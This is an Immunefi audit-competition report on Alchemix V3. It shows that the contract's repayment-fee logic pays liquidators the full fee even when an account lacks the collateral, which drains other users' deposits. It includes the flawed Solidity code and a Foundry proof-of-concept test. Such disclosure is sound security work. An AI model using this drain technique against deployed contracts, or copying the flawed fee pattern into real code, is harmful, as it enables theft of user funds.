# 58036 sc critical incorrect fee deduction may drain collateral pool when account balance is insufficient

**Submitted on Oct 30th 2025 at 06:59:09 UTC by @joicygiore for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #58036
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Protocol insolvency

## Description

## Brief/Intro

During liquidation or repayment, the contract calls `_resolveRepaymentFee()` to deduct a fee from the user’s collateral balance and transfer it to the liquidator. However, when the account’s collateral balance is insufficient, the function still issues the full fee amount, effectively paying the remaining fee using the global collateral pool. This behavior can unintentionally deplete collateral belonging to other users.

## Vulnerability Details

As shown below, the repayment logic deducts the smaller of fee or `account.collateralBalance` from the account, but always returns the full fee amount. The caller (liquidator) subsequently receives this full fee, regardless of whether the account had enough collateral to cover it.

```js
    // AlchemistV3::_resolveRepaymentFee()
    function _resolveRepaymentFee(uint256 accountId, uint256 repaidAmountInYield) internal returns (uint256 fee) {
        Account storage account = _accounts[accountId];
        // calculate repayment fee and deduct from account
@>        fee = repaidAmountInYield * repaymentFee / BPS;
@>        account.collateralBalance -= fee > account.collateralBalance ? account.collateralBalance : fee;
        emit RepaymentFee(accountId, repaidAmountInYield, msg.sender, fee);
        return fee;
    }
```

`AlchemistV3::_resolveRepaymentFee()` function is invoked from `_liquidate()` as follows:

```js
    // AlchemistV3::_liquidate()
    function _liquidate(uint256 accountId) internal returns (uint256 amountLiquidated, uint256 feeInYield, uint256 feeInUnderlying) {
        
        // SNIP...

        if (account.debt == 0) {
@>            feeInYield = _resolveRepaymentFee(accountId, repaidAmountInYield);
@>            TokenUtils.safeTransfer(myt, msg.sender, feeInYield);
            return (repaidAmountInYield, feeInYield, 0);
        }

        // Recalculate ratio after any repayment to determine if further liquidation is needed
        collateralInUnderlying = totalValue(accountId);
        collateralizationRatio = collateralInUnderlying * FIXED_POINT_SCALAR / account.debt;

        if (collateralizationRatio <= collateralizationLowerBound) {
            // Do actual liquidation
            return _doLiquidation(accountId, collateralInUnderlying, repaidAmountInYield);
        } else {
            // Since only a repayment happened, send repayment fee to caller
@>            feeInYield = _resolveRepaymentFee(accountId, repaidAmountInYield);
@>            TokenUtils.safeTransfer(myt, msg.sender, feeInYield);
            return (repaidAmountInYield, feeInYield, 0);
        }
    }
```

Even if the account has insufficient collateral, the liquidator still receives a full payout, effectively draining funds from the overall contract balance, which includes collateral belonging to other users.

## Impact Details

If an insolvent position is liquidated, the function compensates the liquidator with the full fee amount, drawing the deficit from the contract’s total collateral balance. This can lead to:

* Depletion of other users’ deposits.
* Inability for unaffected users to withdraw their full collateral. Thus, this issue can result in loss of user funds and compromise the protocol’s solvency.

## References

<https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/AlchemistV3.sol#L900-L907>

## Proof of Concept

## Proof of Concept

Add the following test to `src/test/AlchemistV3.t.sol` and run it:

```js
    function test_resolveRepaymentFee() public {
        /////////////////////////
        //  userOne deposit()  //
        /////////////////////////
        address userOne = makeAddr("userOne");
        vm.prank(address(0xdead));
        whitelist.add(userOne);
        deal(address(vault), userOne, accountFunds);
        vm.startPrank(userOne);
        SafeERC20.safeApprove(address(vault), address(alchemist), depositAmount + 100e18);
        alchemist.deposit(depositAmount, userOne, 0);
        vm.stopPrank();
        uint256 tokenIdForUserOne = AlchemistNFTHelper.getFirstTokenId(userOne, address(alchemistNFT));
        ////////////////////////////////
        //  0xbeef deposit() + mint() //
        ////////////////////////////////
        vm.startPrank(address(0xbeef));
        SafeERC20.safeApprove(address(vault), address(alchemist), depositAmount + 100e18);
        alchemist.deposit(depositAmount, address(0xbeef), 0);
        uint256 tokenIdFor0xBeef = AlchemistNFTHelper.getFirstTokenId(address(0xbeef), address(alchemistNFT));
        uint256 mintAmount = alchemist.totalValue(tokenIdFor0xBeef) * FIXED_POINT_SCALAR / minimumCollateralization;
        alchemist.mint(tokenIdFor0xBeef, mintAmount, address(0xbeef));
        vm.stopPrank();


        /////////////////////////////////////////////
        //  anotherExternalUser createRedemption() //
        /////////////////////////////////////////////
        vm.startPrank(anotherExternalUser);
        SafeERC20.safeApprove(address(alToken), address(transmuterLogic), mintAmount);
        transmuterLogic.createRedemption(mintAmount);
        vm.stopPrank();


        vm.roll(block.number + 5_256_000);

        uint256 initialVaultSupply = IERC20(address(mockStrategyYieldToken)).totalSupply();
        IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(initialVaultSupply);
        uint256 modifiedVaultSupply = (initialVaultSupply * 1200 / 10_000) + initialVaultSupply;
        IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(modifiedVaultSupply);

        // Cache balace  
        uint256 balanceForAlchemistBeforeLiquidate = vault.balanceOf(address(alchemist));

        ////////////////////////////////
        //  externalUser liquidate()  //
        ////////////////////////////////
        
        vm.prank(externalUser);
        alchemist.liquidate(tokenIdFor0xBeef);

        uint fee = depositAmount * alchemist.repaymentFee() / 10_000;
        // Cache balace  
        uint256 balanceForAlchemistAfterLiquidate = vault.balanceOf(address(alchemist));


        // check alchemist contract balance 
        assertEq(depositAmount + fee, balanceForAlchemistBeforeLiquidate - balanceForAlchemistAfterLiquidate);

        // Note that the fee is not deducted from 0xbeef's collateral balance, but is drawn from the alchemist contract's balance - which consists of userOne deposits. Therefore, when the userOne attempts to withdraw all deposits, the transaction will revert due to insufficient contract balance. ❌
        vm.prank(userOne);
        vm.expectRevert();
        alchemist.withdraw(depositAmount, userOne, tokenIdForUserOne);
    }
```
